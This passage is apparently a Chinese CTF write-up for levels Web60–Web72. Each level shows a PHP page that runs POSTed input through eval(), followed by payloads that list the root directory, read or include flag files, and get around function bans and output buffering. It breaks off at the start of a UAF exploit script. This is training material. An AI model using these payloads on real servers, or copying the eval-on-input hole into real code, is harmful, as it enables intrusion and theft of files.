class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">题目：</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t一模一样，直接给 paylaod：</p>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web61\"><a class=\"markdownIt-Anchor\" href=\"#web61\">#</a> Web61：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\tshow_source 百试不爽啊。</p>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web62\"><a class=\"markdownIt-Anchor\" href=\"#web62\">#</a> Web62：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web63\"><a class=\"markdownIt-Anchor\" href=\"#web63\">#</a> Web63：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web64\"><a class=\"markdownIt-Anchor\" href=\"#web64\">#</a> Web64：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web65\"><a class=\"markdownIt-Anchor\" href=\"#web65\">#</a> Web65：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web66\"><a class=\"markdownIt-Anchor\" href=\"#web66\">#</a> Web66：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\tshow_source 函数被 ban 了，highlight_file 没有被 ban，试试看，结果 flag 没有在 flag.php 里，通过如下 payload 发现 flag 在根目录下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&quot;/&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var ) </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t那就用 highlight_file 去读根目录：</p>\n<h1 id=\"web67\"><a class=\"markdownIt-Anchor\" href=\"#web67\">#</a> Web67：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\tprint_r 被过滤了，试试看 var_dump，没有被过滤，继续 scandir 去读目录结构。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&quot;/&quot;</span>));</span><br><span class=\"line\">c=<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web68\"><a class=\"markdownIt-Anchor\" href=\"#web68\">#</a> Web68：</h1>\n<p>​\t\t由于 highlight_file () 被 ban 了，读不到源码，所以就直接开打了，先测一下 var_dump，var_dump 和 scandir 都没有被 ban，直接读根目录，找到了 flag.txt：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&quot;/&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#array(21) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; &#125; </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就是其他手法了，根据 txt 文件，推测 flag 应该不会被当作 php 代码执行，所以试着使用文件包含等手法读 flag：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"keyword\">include</span>(<span class=\"string\">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web69\"><a class=\"markdownIt-Anchor\" href=\"#web69\">#</a> Web69：</h1>\n<p>​\t\tban 了 highlight_file、var_dump，那就用 var_export，输出目录结构：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">var_export</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&quot;/&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 include 包含 /flag.txt 文件即可得到 flag。</p>\n<h1 id=\"web70\"><a class=\"markdownIt-Anchor\" href=\"#web70\">#</a> Web70：</h1>\n<p>​\t\t通过 var_export 读取文件目录结构，再用 include 包含 /flag.txt，和上面几个题没有任何区别。</p>\n<h1 id=\"web71\"><a class=\"markdownIt-Anchor\" href=\"#web71\">#</a> Web71：</h1>\n<p>​\t\t附件里给了源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;display_errors&#x27;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">ob_get_contents</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">ob_end_clean</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class=\"string\">&quot;?&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t有几个点需要注意：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">ob_get_contents</span>();<span class=\"comment\">//得到缓冲区的数据。</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ob_end_clean</span>();<span class=\"comment\">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t也就是说，这里需要在执行上面两个函数之前，把程序输出出来就行了，这个时候，就可以选择提前结束掉整个程序，因为缓冲区就是在程序结束之前需要将里面的所有内容全部输出才行：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">var_export</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&#x27;/&#x27;</span>));<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"keyword\">include</span>(<span class=\"string\">&quot;/flag.txt&quot;</span>);<span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n<h1 id=\"web72\"><a class=\"markdownIt-Anchor\" href=\"#web72\">#</a> Web72：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;display_errors&#x27;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">ob_get_contents</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">ob_end_clean</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class=\"string\">&quot;?&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\tscandir 被禁了，这里没什么思路，不过，这里有大佬通过 glob 伪协议读取了根目录文件名：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"string\">&quot;glob:///*&quot;</span>);<span class=\"keyword\">foreach</span>(<span class=\"variable\">$a</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"variable\">$f</span>.<span class=\"string\">&quot;    &quot;</span> ;&#125;<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t通过 include 读取文件的时候发现没有权限，先列一些读取文件的函数吧：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">readfile</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;example.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);<span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>, <span class=\"title function_ invoke__\">filesize</span>(<span class=\"string\">&quot;example.txt&quot;</span>));<span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"variable\">$fileContents</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&quot;example.txt&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就是利用 uaf 脚本进行命令执行了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span 